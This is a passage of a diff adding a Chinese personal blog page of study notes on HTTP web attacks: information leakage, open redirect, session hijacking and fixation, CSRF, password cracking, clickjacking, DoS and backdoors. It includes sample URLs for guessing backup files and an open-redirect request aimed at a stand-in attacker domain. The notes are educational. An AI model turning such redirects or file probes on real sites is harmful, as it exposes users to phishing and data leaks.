+<li>&#x6CC4;&#x6F0F;&#x539F;&#x672C;&#x9700;&#x8981;&#x5177;&#x4F53;&#x6709;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x7684;&#x7528;&#x6237;&#x624D;&#x53EF;&#x67E5;&#x9605;&#x7684;&#x4FE1;&#x606F;&#x5185;&#x5BB9;</li>
+<li>&#x6CC4;&#x6F0F;&#x672A;&#x5916;&#x8FDE;&#x5230;&#x5916;&#x754C;&#x7684;&#x6587;&#x4EF6;</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">// &#x5982;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x540D;&#x79F0;</div><div class="line">http://example.com/cgi-bin/entry.cgi</div><div class="line">http://example.com/cgi-bin/entry.bak</div><div class="line">http://example.com/cgi-bin/entry.cgi.bak</div><div class="line"></div><div class="line">// &#x5982;&#x6709;&#x89C4;&#x5F8B;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x79F0;</div><div class="line">http://example.com/entry/entry_170805.log</div><div class="line">http://example.com/entry/entry_170806.log</div><div class="line"></div><div class="line">// &#x5982;&#x5F3A;&#x5236;&#x6D4F;&#x89C8;&#x67D0;&#x4E2A;&#x56FE;&#x7247;&#x5730;&#x5740;</div><div class="line">http://example.com/img/ASFASNIQWKLSFA.jpg</div></pre></td></tr></table></figure>
+<p><code>2.&#x4E0D;&#x6B63;&#x786E;&#x7684;&#x9519;&#x8BEF;&#x6D88;&#x606F;&#x5904;&#x7406;</code></p>
+<p>&#x4E0D;&#x6B63;&#x786E;&#x7684;&#x9519;&#x8BEF;&#x6D88;&#x606F;&#x5904;&#x7406;(Error Handling Vulnerability)&#x7684;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x662F;&#x6307;,  Web &#x5E94;&#x7528;&#x7684;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x5185;&#x5305;&#x542B;&#x5BF9;&#x653B;&#x51FB;&#x8005;&#x6709;&#x7528;&#x7684;&#x4FE1;&#x606F;.</p>
+<p>&#x4E0E; Web &#x5E94;&#x7528;&#x6709;&#x5173;&#x7684;&#x4E3B;&#x8981;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x5982;&#x4E0B;:</p>
+<ul>
+<li>Web&#x5E94;&#x7528;&#x629B;&#x51FA;&#x7684;&#x9519;&#x8BEF;&#x6D88;&#x606F;</li>
+<li>&#x6570;&#x636E;&#x5E93;&#x7B49;&#x7CFB;&#x7EDF;&#x629B;&#x51FA;&#x7684;&#x9519;&#x8BEF;&#x6D88;&#x606F;</li>
+</ul>
+<p>&#x5BF9;&#x7528;&#x6237;&#x6765;&#x8BF4;, Web &#x6D4F;&#x89C8;&#x5668;&#x4E0D;&#x5FC5;&#x7ED9;&#x7528;&#x6237;&#x5C55;&#x793A;&#x8BE6;&#x7EC6;&#x7684;&#x9519;&#x8BEF;&#x6D88;&#x606F;. &#x5BF9;&#x653B;&#x51FB;&#x8005;&#x6765;&#x8BF4;, &#x8BE6;&#x7EC6;&#x7684;&#x9519;&#x8BEF;&#x6D88;&#x606F;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x7ED9;&#x653B;&#x51FB;&#x8005;&#x521B;&#x5EFA;&#x4E0B;&#x6B21;&#x653B;&#x51FB;&#x7684;&#x6709;&#x5229;&#x6761;&#x4EF6;.</p>
+<p>&#x7CFB;&#x7EDF;&#x629B;&#x51FA;&#x7684;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x4E3B;&#x8981;&#x96C6;&#x4E2D;&#x5728;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;:</p>
+<ul>
+<li>PHP &#x6216; ASP &#x7B49;&#x811A;&#x672C;&#x9519;&#x8BEF;</li>
+<li>&#x6570;&#x636E;&#x5E93;&#x6216;&#x4E2D;&#x95F4;&#x4EF6;&#x7684;&#x9519;&#x8BEF;</li>
+<li>Web&#x670D;&#x52A1;&#x5668;&#x7684;&#x9519;&#x8BEF;</li>
+</ul>
+<p><code>3.&#x5F00;&#x653E;&#x91CD;&#x5B9A;&#x5411;</code></p>
+<p>&#x5F00;&#x653E;&#x91CD;&#x5B9A;&#x5411;(Open Redirect)&#x662F;&#x4E00;&#x79CD;&#x5BF9;&#x6307;&#x5B9A;&#x4EFB;&#x610F;URL&#x4F5C;&#x91CD;&#x5B9A;&#x5411;&#x8DF3;&#x8F6C;&#x7684;&#x529F;&#x80FD;. &#x82E5;&#x91CD;&#x5B9A;&#x5411;&#x7684;URL&#x88AB;&#x52AB;&#x6301;, &#x6709;&#x53EF;&#x80FD;&#x5C31;&#x4F1A;&#x8BF1;&#x5BFC;&#x81F3;&#x653B;&#x51FB;&#x8005;&#x7684;&#x7F51;&#x5740;.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">// &#x5F00;&#x653E;&#x6027;&#x91CD;&#x5B9A;&#x5411;&#x6B63;&#x5E38;&#x8BF7;&#x6C42;</div><div class="line">http://exmaple.com?redirect=http://tricorder.jp</div><div class="line"></div><div class="line">// &#x88AB;&#x52AB;&#x6301;&#x66F4;&#x6539;&#x7684;&#x91CD;&#x5B9A;&#x5411;&#x8BF7;&#x6C42;</div><div class="line">http://exmaple.com?redirect=http://hackr.jp</div></pre></td></tr></table></figure>
+<blockquote>
+<p>&#x56E0;&#x4F1A;&#x8BDD;&#x7BA1;&#x7406;&#x758F;&#x5FFD;&#x5F15;&#x53D1;&#x7684;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;</p>
+</blockquote>
+<p><code>1.&#x4F1A;&#x8BDD;&#x52AB;&#x6301;</code></p>
+<p>&#x4F1A;&#x8BDD;&#x52AB;&#x6301;(Session Hijack)&#x662F;&#x6307;&#x653B;&#x51FB;&#x8005;&#x901A;&#x8FC7;&#x67D0;&#x79CD;&#x624B;&#x6BB5;&#x62FF;&#x5230;&#x4E86;&#x7528;&#x6237;&#x7684;&#x4F1A;&#x8BDD;ID, &#x5E76;&#x975E;&#x6CD5;&#x4F7F;&#x7528;&#x4F1A;&#x8BDD;ID&#x4F2A;&#x88C5;&#x6210;&#x7528;&#x6237;, &#x8FBE;&#x5230;&#x653B;&#x51FB;&#x7684;&#x76EE;&#x7684;. &#x4EE5;&#x4E0B;&#x51E0;&#x79CD;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x83B7;&#x5F97;&#x4F1A;&#x8BDD;ID:</p>
+<ul>
+<li>&#x901A;&#x8FC7;&#x975E;&#x6B63;&#x89C4;&#x7684;&#x751F;&#x6210;&#x65B9;&#x6CD5;&#x63A8;&#x6D4B;&#x4F1A;&#x8BDD;ID</li>
+<li>&#x901A;&#x8FC7;&#x7A83;&#x542C;&#x6216;XSS&#x653B;&#x51FB;&#x76D7;&#x53D6;&#x4F1A;&#x8BDD;ID</li>
+<li>&#x901A;&#x8FC7;&#x4F1A;&#x8BDD;&#x56FA;&#x5B9A;&#x653B;&#x51FB;(Session Fixation)&#x5F3A;&#x884C;&#x83B7;&#x53D6;&#x4F1A;&#x8BDD;ID</li>
+</ul>
+<p><code>2.&#x4F1A;&#x8BDD;&#x56FA;&#x5B9A;&#x653B;&#x51FB;</code></p>
+<p>&#x5BF9;&#x4EE5;&#x7A83;&#x53D6;&#x76EE;&#x6807;&#x4F1A;&#x8BDD;ID&#x4E3A;&#x4E3B;&#x52A8;&#x624B;&#x6BB5;&#x7684;&#x4F1A;&#x8BDD;&#x52AB;&#x6301;&#x800C;&#x8A00;, &#x4F1A;&#x8BDD;(Session Fixation)&#x56FA;&#x5B9A;&#x4F1A;&#x5F3A;&#x5236;&#x7528;&#x6237;&#x4F7F;&#x7528;&#x653B;&#x51FB;&#x8005;&#x6307;&#x5B9A;&#x7684;&#x4F1A;&#x8BDD;ID, &#x5C5E;&#x4E8E;&#x88AB;&#x52A8;&#x653B;&#x51FB;.</p>
+<p><code>3.&#x8DE8;&#x7AD9;&#x70B9;&#x8BF7;&#x6C42;&#x4F2A;&#x9020;</code></p>
+<p>&#x8DE8;&#x7AD9;&#x70B9;&#x8BF7;&#x6C42;&#x4F2A;&#x9020;(Cross-Site Request Forgeries, CSRF)&#x653B;&#x51FB;&#x662F;&#x6307;&#x653B;&#x51FB;&#x8005;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x597D;&#x7684;&#x9677;&#x9631;, &#x5F3A;&#x5236;&#x5BF9;&#x5DF2;&#x5B8C;&#x6210;&#x8BA4;&#x8BC1;&#x7684;&#x7528;&#x6237;&#x8FDB;&#x884C;&#x975E;&#x9884;&#x671F;&#x7684;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x6216;&#x8BBE;&#x5B9A;&#x4FE1;&#x606F;&#x7B49;&#x67D0;&#x4E9B;&#x72B6;&#x6001;&#x66F4;&#x65B0;, &#x5C5E;&#x4E8E;&#x88AB;&#x52A8;&#x653B;&#x51FB;.</p>
+<p>&#x53EF;&#x80FD;&#x9020;&#x6210;&#x7684;&#x5F71;&#x54CD;:</p>
+<ul>
+<li>&#x5229;&#x7528;&#x5DF2;&#x901A;&#x8FC7;&#x8BA4;&#x8BC1;&#x7684;&#x7528;&#x6237;&#x6743;&#x9650;&#x66F4;&#x65B0;&#x8BBE;&#x5B9A;&#x4FE1;&#x606F;&#x7B49;</li>
+<li>&#x5229;&#x7528;&#x5DF2;&#x901A;&#x8FC7;&#x8BA4;&#x8BC1;&#x7684;&#x7528;&#x6237;&#x6743;&#x9650;&#x8D2D;&#x4E70;&#x5546;&#x54C1;</li>
+<li>&#x5229;&#x7528;&#x5DF2;&#x901A;&#x8FC7;&#x8BA4;&#x8BC1;&#x7684;&#x7528;&#x6237;&#x6743;&#x9650;&#x5728;&#x7559;&#x8A00;&#x677F;&#x4E0A;&#x53D1;&#x8868;&#x8A00;&#x8BBA;</li>
+</ul>
+<blockquote>
+<p>&#x5176;&#x4ED6;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;</p>
+</blockquote>
+<p><code>1.&#x5BC6;&#x7801;&#x7834;&#x89E3;</code></p>
+<p>&#x5BC6;&#x7801;&#x7834;&#x89E3;&#x653B;&#x51FB;(Password Cracking)&#x5373;&#x7B97;&#x51FA;&#x5BC6;&#x7801;, &#x7A81;&#x7834;&#x8BA4;&#x8BC1;. &#x653B;&#x51FB;&#x4E0D;&#x4EC5;&#x9650;&#x4E8E; Web &#x5E94;&#x7528;, &#x8FD8;&#x5305;&#x62EC;&#x5176;&#x4ED6;&#x7684;&#x7CFB;&#x7EDF;(&#x5982;FTP&#x6216;SSH&#x7B49;).</p>
+<p>&#x5BC6;&#x7801;&#x7834;&#x89E3;&#x6709;&#x4EE5;&#x4E0B;&#x4E24;&#x79CD;&#x624B;&#x6BB5;:</p>
+<ul>
+<li>&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x7684;&#x5BC6;&#x7801;&#x8BD5;&#x9519;. &#x65B9;&#x5F0F;&#x6709; <code>&#x7A77;&#x4E3E;&#x6CD5;</code> &#x548C; <code>&#x5B57;&#x5178;&#x653B;&#x51FB;</code></li>
+<li>&#x5BF9;&#x5DF2;&#x52A0;&#x5BC6;&#x5BC6;&#x7801;&#x7684;&#x7834;&#x89E3;(&#x6307;&#x653B;&#x51FB;&#x8005;&#x5165;&#x4FB5;&#x7CFB;&#x7EDF;, &#x5DF2;&#x83B7;&#x5F97;&#x52A0;&#x5BC6;&#x6216;&#x6563;&#x5217;&#x5904;&#x7406;&#x7684;&#x5BC6;&#x7801;&#x6570;&#x636E;&#x7684;&#x60C5;&#x51B5;). &#x65B9;&#x5F0F;&#x6709; <code>&#x901A;&#x8FC7;&#x7A77;&#x4E3E;&#x6CD5; &amp;quot; &#x5B57;&#x5178;&#x653B;&#x51FB;&#x8FDB;&#x884C;&#x7C7B;&#x63A8;</code>, <code>&#x5F69;&#x8679;&#x8868;</code>, <code>&#x62FF;&#x5230;&#x5BC6;&#x94A5;</code> &#x548C; <code>&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x7684;&#x6F0F;&#x6D1E;</code>.</li>
+</ul>
+<p>&#x9664;&#x53BB;&#x7A81;&#x7834;&#x8BA4;&#x8BC1;&#x7684;&#x653B;&#x51FB;&#x624B;&#x6BB5;, &#x8FD8;&#x6709;SQL&#x6CE8;&#x5165;&#x653B;&#x51FB;&#x9003;&#x907F;&#x8BA4;&#x8BC1;, &#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;&#x7A83;&#x53D6;&#x5BC6;&#x7801;&#x4FE1;&#x606F;&#x7B49;&#x65B9;&#x6CD5;.</p>
+<p><code>2.&#x70B9;&#x51FB;&#x52AB;&#x6301;</code></p>
+<p>&#x70B9;&#x51FB;&#x52AB;&#x6301;(Clickjacking)&#x662F;&#x6307;&#x5229;&#x7528;&#x900F;&#x660E;&#x7684;&#x6309;&#x94AE;&#x6216;&#x94FE;&#x63A5;&#x505A;&#x6210;&#x9677;&#x9631;,&#x8986;&#x76D6;&#x5728; Web &#x9875;&#x9762;&#x4E4B;&#x4E0A;, &#x7136;&#x540E;&#x8BF1;&#x4F7F;&#x7528;&#x6237;&#x5728;&#x4E0D;&#x77E5;&#x60C5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;, &#x70B9;&#x51FB;&#x90A3;&#x4E2A;&#x94FE;&#x63A5;&#x8BBF;&#x95EE;&#x5185;&#x5BB9;&#x7684;&#x4E00;&#x79CD;&#x653B;&#x51FB;&#x624B;&#x6BB5;. &#x8FD9;&#x79CD;&#x884C;&#x4E3A;&#x4E5F;&#x79F0;&#x754C;&#x9762;&#x4F2A;&#x88C5;(UI Redressing).</p>
+<p><code>3.Dos&#x653B;&#x51FB;</code></p>
+<p>Dos&#x653B;&#x51FB;(Denial of Service attack)&#x662F;&#x4E00;&#x79CD;&#x8BA9;&#x8FD0;&#x884C;&#x4E2D;&#x7684;&#x670D;&#x52A1;&#x5448;&#x505C;&#x6B62;&#x72B6;&#x6001;&#x7684;&#x653B;&#x51FB;. &#x6709;&#x65F6;&#x53EB;&#x505A;&#x670D;&#x52A1;&#x505C;&#x6B62;&#x6216;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x653B;&#x51FB;. &#x4E0D;&#x4EC5;&#x9650;&#x4E8E; Web &#x7F51;&#x7AD9;, &#x8FD8;&#x5305;&#x62EC;&#x7F51;&#x7EDC;&#x8BBE;&#x5907;&#x53CA;&#x670D;&#x52A1;&#x5668;&#x7B49;.</p>
+<p>&#x4E3B;&#x8981;&#x6709;&#x4EE5;&#x4E0B;&#x4E24;&#x79CD; Dos &#x653B;&#x51FB;&#x65B9;&#x5F0F;:</p>
+<ul>
+<li>&#x96C6;&#x4E2D;&#x5229;&#x7528;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;&#x9020;&#x6210;&#x8D44;&#x6E90;&#x8FC7;&#x8F7D;, &#x8D44;&#x6E90;&#x7528;&#x5C3D;&#x7684;&#x540C;&#x65F6;, &#x5B9E;&#x9645;&#x4E0A;&#x670D;&#x52A1;&#x4E5F;&#x5C31;&#x7A0B;&#x505C;&#x6B62;&#x72B6;&#x6001;.</li>
+<li>&#x901A;&#x8FC7;&#x653B;&#x51FB;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x4F7F;&#x670D;&#x52A1;&#x505C;&#x6B62;.</li>
+</ul>
+<p>&#x591A;&#x53F0;&#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x8D77;&#x7684; Dos &#x653B;&#x51FB;&#x79F0;&#x4E3A; DDos&#x653B;&#x51FB;(Distributed Denial of Service attack)</p>
+<p><code>4.&#x540E;&#x95E8;&#x7A0B;&#x5E8F;</code></p>
+<p>&#x540E;&#x95E8;&#x7A0B;&#x5E8F;(Backdoor)&#x662F;&#x6307;&#x5F00;&#x53D1;&#x8BBE;&#x7F6E;&#x7684;&#x9690;&#x85CF;&#x5165;&#x53E3;, &#x53EF;&#x4E0D;&#x6309;&#x6B63;&#x5E38;&#x6B65;&#x9AA4;&#x4F7F;&#x7528;&#x7684;&#x53D7;&#x9650;&#x529F;&#x80FD;.</p>
+<p>&#x901A;&#x5E38;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B; 3 &#x79CD;&#x7C7B;&#x578B;:</p>
+<ul>
+<li>&#x5F00;&#x53D1;&#x9636;&#x6BB5;&#x4F5C;&#x4E3A; Debug &#x8C03;&#x7528;&#x7684;&#x540E;&#x95E8;&#x7A0B;&#x5E8F;</li>
+<li>&#x5F00;&#x53D1;&#x8005;&#x4E3A;&#x4E86;&#x81EA;&#x8EAB;&#x5229;&#x76CA;&#x690D;&#x5165;&#x7684;&#x540E;&#x95E8;&#x7A0B;&#x5E8F;</li>
+<li>&#x653B;&#x51FB;&#x8005;&#x901A;&#x8FC7;&#x67D0;&#x79CD;&#x65B9;&#x6CD5;&#x8BBE;&#x7F6E;&#x7684;&#x540E;&#x95E8;&#x7A0B;&#x5E8F;</li>
+</ul>
+<blockquote>
+<p>&#x6CE8;&#x660E;</p>
+</blockquote>
+<p>&#x4EE5;&#x4E0A;&#x6458;&#x5F55;&#x81F3; &lt;&lt;&#x56FE;&#x89E3;HTTP&gt;&gt; &#x4F5C;&#x4E3A;&#x4E2A;&#x4EBA;&#x9605;&#x8BFB;&#x540E;&#x7684;&#x590D;&#x4E60;&#x7B14;&#x8BB0;.</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2017/07/31/http-sth/" data-toggle="tooltip" data-placement="top"
+                           title="A little bit of HTTP sth sth.">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+                <!-- 多说评论框 start -->
+                <div class="comment">
+                    <div class="ds-thread"
+                         data-thread-key="2017/08/02/http-web-attack/"
+                         data-title="Take a great notice on the Web Attack via HTTP."
+                         data-url="https://linzhenzhen.github.io/2017/08/02/http-web-attack/">
+                    </div>
+                </div>
+                <!-- 多说评论框 end -->
+                
+
+                
+                <!-- disqus 评论框 start -->
+                <div class="comment">
+                    <div id="disqus_thread" class="disqus-thread"></div>
+                </div>
+                <!-- disqus 评论框 end -->
+                
+
+            </div>
+            <!-- Side Catalog Container -->
+            
+
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#HTTP"
+                           title="HTTP">HTTP</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                    <li><a href="http://www.xinxiaoyang.com/" target="_blank">昕小阳</a></li>
+                    
+                    <li><a href="#" target="_blank">scarlett</a></li>
+                    
+                    <li><a href="http://www.malin.xyz/" target="_blank">malin&#39;s blog</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    // dynamic User by Hux
+    var _user = 'linzhenzhen';
+
+    // duoshuo comment query.
+    var duoshuoQuery = {short_name: _user};
+    (function () {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';
+        ds.async = true;
+        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0]
+        || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+</script>
+<!-- 多说公共JS代码 end -->
+
+
+
+
+<!-- disqus 公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "linzhenzhen";
+    var disqus_identifier = "https://linzhenzhen.github.io/2017/08/02/http-web-attack/";
+    var disqus_url = "https://linzhenzhen.github.io/2017/08/02/http-web-attack/";
+
+    (function () {
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+        var d = document, t = 'script',
+                o = d.createElement(t),
+                s = d.getElementsByTagName(t)[0];
+        o.src = u;
+        if (c) {
+            o.addEventListener('load', function (e) {
+                c(null, e);
+            }, false);
+        }
+        s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("http://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function () {
+        anchors.options = {
+            visible: 'always',
+            placement: 'right',
+            icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link {
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top: -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+<li>
+    <a target="_blank"
+       href="https://github.com/linzhenzhen"
+       data-toggle="tooltip" data-placement="top" title="linzhenzhen">
+        <span class="fa-stack fa-lg">
+            <i class="fa fa-circle fa-stack-2x"></i>
+            <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+        </span>
+    </a>
+</li>
+
+
+<li>
+    <a target="_blank"
+       href="http://weibo.com/mslinzz"
+       data-toggle="tooltip" data-placement="top" title="mslinzz">
+        <span class="fa-stack fa-lg">
+            <i class="fa fa-circle fa-stack-2x"></i>
+            <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+        </span>
+    </a>
+</li>
+
+
+<li>
+    <a target="_blank"
+       href="mailto:mslinzz@sina.com"
+       data-toggle="tooltip" data-placement="top" title="mslinzz@sina.com">
+        <span class="fa-stack fa-lg">
+            <i class="fa fa-circle fa-stack-2x"></i>
+            <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+        </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="javascript:void(0)"
+       data-toggle="tooltip" data-placement="top" title="549221572">
+        <span class="fa-stack fa-lg">
+            <i class="fa fa-circle fa-stack-2x"></i>
+            <i class="fa fa-weixin fa-stack-1x fa-inverse"></i>
+        </span>
+    </a>
+</li>
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Ms.Linzz 2017 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">
+                    <span style="display: inline-block; margin: 0 3px;">
+                        <i class="fa fa-thumbs-up"></i>
+                    </span> Huxpro </a>
+                    Ported by <a href="http://mslinzz.com"> Ms.Linzz </a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=linzhenzhen&repo=linzhenzhen.github.io&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://linzhenzhen.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<!--http://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js-->
+<script>
+    async("https://linzhenzhen.github.io/js/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+<!-- Google Analytics -->
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-101227779-1';
+    var _gaDomain = 'http://linzhenzhen.github.io';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    //ga('create', _gaId, _gaDomain);
+    ga('create', _gaId, 'auto');
+    ga('send', 'pageview');
+</script>
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '611610fbe36c573f87d27fd168a6feeb';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://linzhenzhen.github.io/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+</body>
+</html>
